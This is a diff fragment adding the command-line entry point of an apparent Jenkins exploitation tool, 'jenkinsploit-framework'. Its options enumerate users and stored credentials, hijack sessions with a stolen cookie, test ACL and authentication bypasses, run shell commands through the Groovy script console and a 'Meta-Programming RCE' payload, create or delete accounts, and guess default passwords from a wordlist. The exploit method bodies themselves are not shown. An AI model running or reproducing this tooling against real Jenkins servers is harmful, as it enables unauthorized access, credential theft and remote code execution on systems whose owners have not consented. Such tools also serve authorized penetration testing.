+        acl_hrefs_sorted = sorted(list(set(acl_hrefs)))
+        print("=" * 50)
+        print("Jenkins ACL Bypass HREF URLs")
+        print("=" * 50)
+
+        for acl_h in acl_hrefs_sorted:
+            ColorOut(" Found HREF: {}".format(acl_h)).green()
+
+        print("=" * 50)
+
+        return self.session
+
+def main():
+    '''Jenkinsploit main()'''
+    parser = ArgumentParser(description="jenkinsploit-framework v0.0.1-pre-alpha | The Jenkins Exploitation Framework | written by k0fin the hack3r ( @k0fin ) | 2021")
+
+    # Main arguments
+    parser.add_argument("url", help="Target Jenkins instance URL (e.g. http://localhost:8080)")
+
+    parser.add_argument("--username", help="Username for authentication to target Jenkins instance")
+    parser.add_argument("--passwd", help="Password for authentication to target Jenkins instance")
+    parser.add_argument("--session", help="Session cookie for authentication/session hijacking")
+
+
+    # Detection arguments
+    parser.add_argument("-s", "--systeminfo", action="store_true", help="Get system information from Jenkins instance")
+    parser.add_argument("-u", "--users", action="store_true", help="Enumerate users from a target Jenkins instance", default=False)
+    parser.add_argument("-c", "--creds", action="store_true", help="Enumerate credentials from a target Jenkins instance", default=False)
+    parser.add_argument("-n", "--nodes", action="store_true", help="Enumerate Jenkins nodes from the target instance")
+    parser.add_argument("-p", "--plugins", action="store_true", help="Enumerate Jenkins plugins from the target instance")
+    parser.add_argument("-w", "--whoami", action='store_true', default=False, help="Get current user / privilege context")
+
+
+    # Attack arguments
+    parser.add_argument("--signup", action="store_true", help="Check /signup endpoint accessibility")
+    parser.add_argument("--capabilities", action="store_true", help="Get capabilities")
+    parser.add_argument("--fingerprint", action="store_true", help="Fingerprint a target Jenkins instance", default=False)
+    parser.add_argument("--opensearch", action="store_true", help="Run OpenSearch test against a target Jenkins instance", default=False)
+    parser.add_argument("--acl", action="store_true", help="Run ACL/Authentication Bypass testing against a target Jenkins instance", default=False)
+    parser.add_argument("--meta-rce", help="Execute a Linux/Bash shell command using a compiled Java payload for exploiting the Jenkins Meta-Programming RCE vulnerability (CVE_HERE)")
+    parser.add_argument("--groovy-sh", help="Execute a Linux/Bash shell command using the Groovy scripting console")
+    parser.add_argument("--groovy-exec", help="Execute a Groovy script one-liner using the Groovy scripting console")
+    parser.add_argument("--groovy-script", help="Execute Groovy source code from a local file")
+
+    # Utility arguments
+    parser.add_argument("--create-user", help="Create Jenkins user account")
+    parser.add_argument("--delete-user", help="Delete Jenkins user account")
+    parser.add_argument("--screenshot", help="Take screenshot of target Jenkins instance")
+    parser.add_argument("--wordlist", default="./wordlists/jenkins-default-passwords.lst", help="Wordlist for dictionary-based password attacks against target Jenkins instance")
+
+    args = vars(parser.parse_args())
+
+    if args["url"]:
+        TARGET_URL = args["url"]
+        j_connection = JenkinsConnect(args["url"])
+        authenticated = None
+
+        print("[*] Connected to Jenkins instance.")
+
+        if args["username"] and args["passwd"]:
+            print("[*] Authenticating to Jenkins instance with provided credentials for Jenkins user ( {} )...".format(args["username"]))
+            j_connection = j_connection.login(args["username"], args["passwd"])
+            authenticated = True
+
+        elif args['session']:
+            print("[*] Attempting to assume privilege context of authenticated Jenkins user session ( {} )...".format(args["session"]))
+            j_connection = j_connection.session(args['session'])
+            authenticated = True
+
+
+        else:
+            print('[*] No credentials or session cookie provided, connecting to target Jenkins instance as an anonymous client.')
+            j_connection = j_connection.anonymous_connect()
+
+        jsploit_session_handler = JenkinsploitSessionHandler(j_connection)
+
+        if args["whoami"]:
+            jsploit_session_handler.getCurrentUser()
+
+        if args["plugins"]:
+            jsploit_session_handler.getPlugins()
+
+        if args["capabilities"]:
+            jsploit_session_handler.getCapabilities()
+
+        if args["systeminfo"]:
+            jsploit_session_handler.getSystemInfo()
+
+        if args["fingerprint"]:
+            jsploit_session_handler.getVersion()
+
+        if args["nodes"]:
+            jsploit_session_handler.getNodes()
+
+        if args["users"]:
+            jsploit_session_handler.getUsers()
+
+        if args["creds"]:
+            jsploit_session_handler.getCredentials()
+
+        if args["opensearch"]:
+            jsploit_session_handler.evalOpenSearch()
+
+        if args["signup"]:
+            jsploit_session_handler.evalSignup()
+
+        if args["acl"]:
+            jsploit_session_handler.evalACLBypass()
+
+        if args["groovy_sh"]:
+            jsploit_session_handler.groovyExec(args['groovy_sh'])
+
+        if args["groovy_exec"]:
+            jsploit_session_handler.groovyExec(args['groovy_exec'])
+
+        if args["groovy_script"]:
+            jsploit_session_handler.groovyExec(args['groovy_script'])
+
+        if args["create_user"]:
+            jsploit_session_handler.createJenkinsUser(username=args['create_user'])
+
+        if args["delete_user"]:
+            jsploit_session_handler.deleteJenkinsUser(username=args['delete_user'])
+
+if __name__ == "__main__":
+
+    jenkinsploit_banner()
+    main()
